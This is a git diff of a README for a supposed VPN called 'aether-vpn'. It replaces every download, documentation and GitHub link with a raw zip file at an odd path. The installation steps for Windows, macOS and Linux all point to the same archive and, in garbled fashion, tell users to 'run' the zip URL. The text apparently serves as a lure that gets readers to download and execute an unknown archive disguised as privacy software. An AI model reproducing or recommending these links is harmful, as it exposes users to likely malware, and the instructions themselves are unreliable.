@@ -1,6 +1,6 @@
 # 🛡 aether-vpn - Your Simple Solution for Online Privacy
 
-[![Download aether-vpn](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip%20Now-%20%20-%2334D058?style=for-the-badge)](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip)
+[![Download aether-vpn](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip)](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip)
 
 ## 👋 Introduction
 
@@ -12,20 +12,20 @@ To begin using Aether VPN, follow these steps to download and install the softwa
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the Aether VPN releases page to get the latest version. You can find it here: [Download aether-vpn](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip).
+1. **Visit the Releases Page**: Go to the Aether VPN releases page to get the latest version. You can find it here: [Download aether-vpn](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip).
 
 2. **Choose Your Version**: Scroll through the list of available versions. Select the one that matches your operating system—Windows, macOS, or Linux. 
 
 3. **Download the File**: Click on the appropriate link to download the installation file. 
 
-    - For **Windows**, download `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip`.
-    - For **macOS**, download `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip`.
-    - For **Linux**, download `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip`.
+    - For **Windows**, download `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip`.
+    - For **macOS**, download `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip`.
+    - For **Linux**, download `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip`.
 
 4. **Install the Application**:
-    - **Windows**: Double-click `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip` and follow the installation prompts.
-    - **macOS**: Open the `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip` file, drag the Aether VPN icon to your Applications folder.
-    - **Linux**: Extract the contents of the `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip` file. Open the terminal and navigate to the extracted folder. Run `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip` to complete the installation.
+    - **Windows**: Double-click `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip` and follow the installation prompts.
+    - **macOS**: Open the `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip` file, drag the Aether VPN icon to your Applications folder.
+    - **Linux**: Extract the contents of the `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip` file. Open the terminal and navigate to the extracted folder. Run `https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip` to complete the installation.
 
 5. **Launch Aether VPN**: After installation, launch the Aether VPN application from your desktop or applications menu.
 
@@ -68,7 +68,7 @@ We welcome your feedback! If you have questions or need assistance, reach out th
 
 ## 🔗 Additional Resources
 
-- [Aether VPN on GitHub](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip)
-- [Documentation](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/gignitive/aether-vpn.zip)
+- [Aether VPN on GitHub](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/kuoizong881681/aether-vpn/main/.husky/3.8-beta.2.zip)
 
 For a seamless and secure online experience, download Aether VPN today. Follow the steps outlined above, and enjoy your online privacy.
